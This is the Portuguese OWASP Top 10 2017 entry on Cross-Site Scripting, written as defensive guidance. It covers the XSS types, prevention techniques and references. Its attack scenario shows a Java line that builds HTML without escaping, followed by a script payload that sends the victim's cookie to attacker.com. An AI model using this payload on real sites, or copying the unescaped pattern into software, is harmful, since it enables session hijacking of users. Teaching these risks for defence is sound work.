# A7:2017 Cross-Site Scripting (XSS)

| Agentes de Ameaça/Vectores de Ataque | Falha de Segurança | Impacto |
| -- | -- | -- |
| Específico App. \| Abuso: 3 | Prevalência: 3 \| Deteção: 3 | Técnico: 2 \| Negócio ? |
| Existem ferramentas automáticas capazes de detetar e tirar partido dos três tipos de XSS. Existem ainda _frameworks_, disponibilizadas gratuitamente, capazes de explorar este problema. | XSS é o segundo maior risco no Top 10 da OWASP e cerca de dois terços das aplicações são vulneráveis a este tipo de ataque. Existem ferramentas automáticas capazes de encontrar problemas de XSS em tecnologías bastantes populares como PHP, J2EE / JSP e ASP.NET. | O impacto do XSS é moderado para os tipos Reflected e DOM XSS mas severo para Stored XSS, onde a execução remota de código no navegador da vítima permite ao atacante roubar credenciais, sessões ou até mesmo infetar a máquina da vítima com _malware_. |

## A Aplicação é Vulnerável?

Existem três tipos de XSS que visam normalmente o navegador dos utilizadores:

* **Reflected XSS**: A aplicação ou API incluem dados de entrada do utilizador
  como parte do HTML da resposta sem que estes tenham sido validados e/ou os
  caracteres especiais tratados (_escaping_). Um ataque bem sucedido pode
  permitir a execução de código HTML e JavaScript no navegador da vítima.
  Normalmente a vítima segue um endereço malicioso para uma página controlada
  pelo atacante tal como _watering hole websites_, publicidade ou algo
  semelhante.
* **Stored XSS**: A aplicação ou API armazenam dados de entrada do utilizador de
  forma não tratada (_sanitization_) os quais serão mais tarde acedidos por
  outro utilizador ou administrador. Este tipo de XSS é considerado de risco
  alto ou crítico.
* **DOM XSS**: Tipicamente as _frameworks_ JavaScript, _Single Page
  Applications_ (SPA) e APIs que incluem na página, de forma dinâmica,
  informação controlada pelo atacante, são vulneráveis a DOM XSS. Idealmente a
  aplicação não enviaria informação controlada pelo atacante para as APIs
  JavaScript.

Os ataques típicos de XSS visam o roubo da sessão do utilizador, roubo ou
controlo da conta de utilizador, contornar autenticação de multi-fator (MFA),
alteração do DOM por substituição ou alteração de nós (e.g. formulários),
ataques contra o navegador do utilizador tais como o download de software
malicioso, _key logging_ entre outros.

## Como Prevenir

Prevenir ataques de XSS requer a separação dos dados não confiáveis do conteúdo
ativo do navegador. Isto é conseguido através da:

* Utilização de _frameworks_ que ofereçam nativamente protecção para XSS tais
  como as versões mais recentes de Ruby on Rails e ReactJS. É preciso conhecer
  as limitações destes mecanismos de proteção por forma a tratar de forma
  adequada os casos não cobertos.
* Tratamento adequado (_escaping_) da informação não confiável no pedido HTTP,
  tendo em conta o contexto onde esta informação irá ser inserida no HTML (body,
  atributo, JavaScript, CSS ou URL), resolve os tipos _Reflected_ e _Stored_
  XSS. Detalhes sobre como tratar esta informação estão no [OWASP Cheat Sheet
  'XSS Prevention'][0xa71].
* Aplicação de codificação de caracteres adequada ao contexto de utilização
  aquando da modificação da página no lado do cliente previne DOM XSS. Quando
  isto não é possível, podem utilizar-se algumas das técnicas referidas no
  documento [OWASP Cheat Sheet 'DOM based XSS Prevention'][0xa72].
* Adição de [Content Security Policy (CSP)][0xa73] enquanto medida de mitigação
  de XSS. É uma medida eficaz se não existirem outras vulnerabilidades que
  possibilitem a inclusão de código malicioso através de ficheiros locais da
  aplicação (e.g. _path traversal overwrites_ ou dependências vulneráveis
  incluídas a partir de CDNs autorizadas).

## Exemplos de Cenários de Ataque

**Cenário #1**: A aplicação usa informação não confiável na construção do HTML
abaixo, sem validação ou escaping:

```Java
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```

O atacante altera o parâmetro `CC` no browser para:

```
'><script>document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'
```

Isto irá fazer com que a sessão da vítima seja enviada para a página do
atacante, dando-lhe o controlo sobre a atual sessão do utilizador.

**Nota**: Os atacantes podem tirar partido do XSS para derrotar qualquer
mecanismo de defesa automática contra [Cross-Site Request Forgery
(CSRF)][0xa74].

## Referências

### OWASP

* [OWASP Proactive Controls: Encode Data][0xa75]
* [OWASP Proactive Controls: Validate Data][0xa76]
* [OWASP Application Security Verification Standard: V5][0xa77]
* [OWASP Testing Guide: Testing for Reflected XSS][0xa78]
* [OWASP Testing Guide: Testing for Stored XSS][0xa79]
* [OWASP Testing Guide: Testing for DOM XSS][0xa710]
* [OWASP Cheat Sheet: XSS Prevention][0xa711]
* [OWASP Cheat Sheet: DOM based XSS Prevention][0xa712]
* [OWASP Cheat Sheet: XSS Filter Evasion][0xa713]
* [OWASP Java Encoder Project][0xa714]

### Externas

* [CWE-79: Improper neutralization of user supplied input][0xa715]
* [PortSwigger: Client-side template injection][0xa716]

[0xa71]: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
[0xa72]: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
[0xa73]: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
[0xa74]: https://developer.mozilla.org/pt-PT/docs/Glossary/CSRF
[0xa75]: https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data
[0xa76]: https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data
[0xa77]: https://owasp.org/www-project-application-security-verification-standard/
[0xa78]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
[0xa79]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting
[0xa710]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting
[0xa711]: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
[0xa712]: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
[0xa713]: https://owasp.org/www-community/xss-filter-evasion-cheatsheet
[0xa714]: https://owasp.org/www-project-java-encoder/
[0xa715]: https://cwe.mitre.org/data/definitions/79.html
[0xa716]: https://portswigger.net/kb/issues/00200308_client-side-template-injection

